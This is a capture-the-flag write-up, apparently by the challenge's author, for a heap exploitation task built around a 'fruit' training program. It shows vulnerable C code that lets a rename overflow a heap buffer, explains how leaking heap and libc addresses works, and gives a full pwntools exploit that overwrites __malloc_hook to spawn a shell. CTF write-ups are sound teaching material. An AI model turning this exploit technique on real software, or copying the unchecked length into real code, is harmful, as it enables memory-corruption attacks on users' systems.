* train_fruit -> this is the edit mechanism, basically you can train your fruit and after a while (random) it gains a level and evolves. When it evolves you can edit its name
* list_fruits -> list all the fruits right now (a linked list that iterates until null)

### The bug
The bug can be found in the evolve mechanism:

```c
fruit_to_train->coolness += rand() % 10 + 1;
   fruit_to_train->tastiness += rand() % 10 + 1;
   if(fruit_to_train->coolness >= 50 && fruit_to_train->tastiness >= 50)   {
      fruit_to_train->coolness = 0;
      fruit_to_train->tastiness = 0;
      puts("Whats this? This fruit is evolving?!");
      if(fruit_to_train->level == 0)   {
         evolve_berry();
      }
      else if(fruit_to_train->level == 1) {
         evolve_apple();
      }
      else if(fruit_to_train->level == 2) {
         evolve_orange();
      }
      fruit_to_train->level++;
      puts("Would you like to rename this fruit? (y/n)");
      char choice[5];
      fgets(choice, 5, stdin);
      if(strstr(choice, "y")) {
         puts("How long do you want this fruit's name to be? (Max 4096 characters)");
         int length;
         scanf("%d", &length);
         getchar();
         if(length > 4096) {
            puts("NO! BAD!");
            exit(-1);
         }
         char new_name[length];
         puts("What do you want this fruit's name to be?");
         __read_chk(0, new_name, length);
         strncpy(fruit_to_train->name, new_name, length);
         return;
      }
      else if(strstr(choice, "n"))  {
         puts("Okay then");
         return;
      }
      else  {
         puts("Dont play games with me >:(");
         exit(-1);
      }
   }
```

As you can see, after a random amount of time, both coolness and tastiness will be greater than 50, and then you can change the name of the fruit in question. However, the new length of the name can be greater than the previous length that was already allocated, this leads to a heap overflow.

### Getting a heap leak
Every time we make a new fruit, the name of the fruit is a pointer to an array of chars, where the array is located in the heap. By making 2 fruits and overwriting the first one's name in order to connect to the next fruits name pointer, we can get a heap leak.

### Getting a libc leak
By changing the size of the top chunk to a certain value, we can invoke a free() call. How? When the size of the top chunk is smaller than the value we want to allocate, the top chunk will be freed and mmap will be called, mapping a new arena. If the size of the top chunk during this time is of a small/large bin, the chunk will be freed and moved to the unsorted bin. Now, for chunks that are freed and put into the unsorted bin, both its fd and bk pointers will point to main arena, which is in libc.

By combining both techniques above, we can get both in just 2 fruits and 3 evolves.

### What next
Well not only can the overwrite of the name pointer be an arbitrary read, but it can also be an arbitrary write. With the libc leak overwriting \_\_malloc\_hook or \_\_free\_hook can result in getting a shell.

Here's my full exploit:

```python
import sys
from pwn import *

if '--local' in sys.argv:
   p = process('./soal')
else:
   p = remote(sys.argv[1], int(sys.argv[2]))

def new_fruit(size, name):
   p.recvuntil("choice", timeout=2)
   p.sendline('1')
   p.sendlineafter(")", str(size))
   p.sendlineafter("?", name)

def train_fruit(num):
   p.sendline('2')
   p.sendlineafter("?\n", num)

def list_fruits():
   p.recvuntil("choice")
   p.sendlineafter(":", '3')
   p.recv(1024)

new_fruit(0x50, "Zafir")
list_fruits()

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '96')
payload = p64(0x0101010101010101)*11 + p64(0xf71)
p.sendlineafter("be?", payload)

new_fruit(0x1000, "A"*0x8)

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendline('y')
p.sendline('112')
payload = p64(0x0101010101010101)*14
p.sendafter("be?", payload)

p.recv(1024)
list_fruits()
heap_leak = int(p.recvuntil('\x55')[-6:][::-1].encode('hex'), 16)

print "HEAP LEAK"
print hex(heap_leak)

heap_offset = -135120
heap_offset_2 = -134976

l = ''
while "evolving" not in l: 
   train_fruit('0')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '120')
payload = p64(0x0101010101010101)*14 + p64(heap_leak+heap_offset_2)
p.sendlineafter("be?", payload)

list_fruits()
p.recvuntil('Name: ')
p.recvuntil('Name: ')
main_arena = int(p.recv(1024)[:6][::-1].encode('hex'), 16)
print "MAIN ARENA"
print hex(main_arena)

libc_base = main_arena + -3951480
one_gadget = libc_base + 0xf02a4
malloc_hook = libc_base + 0x3c4b10

new_fruit(0x50, "one")
new_fruit(0x50, "two")

l = ''
while "evolving" not in l: 
   train_fruit('2')
   l = p.recv(1024)
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '120')
payload = p64(0x0101010101010101)*14 + p64(malloc_hook)
p.sendlineafter("be?", payload)

train_fruit('3')
p.sendlineafter('(y/n)', 'y')
p.sendlineafter('s)', '8')
payload = p64(one_gadget)
p.sendlineafter("be?", payload)

p.sendline("1")

p.interactive()
```

### Feedback to myself
In my part I apologize if my problem ended up being to annoying to solve. I was rushing so the I/O was bad, but I was also too ambitious so I ended up having stupid functions like usleep(), rand() and alarm() which was terrible. I promise in the future I will try to make better problems and fully test them in the future. Congratz to the teams that did solve it, sadly I didn't make it to the finals to meet anyone because I became sick after Cyber Jawara quals.
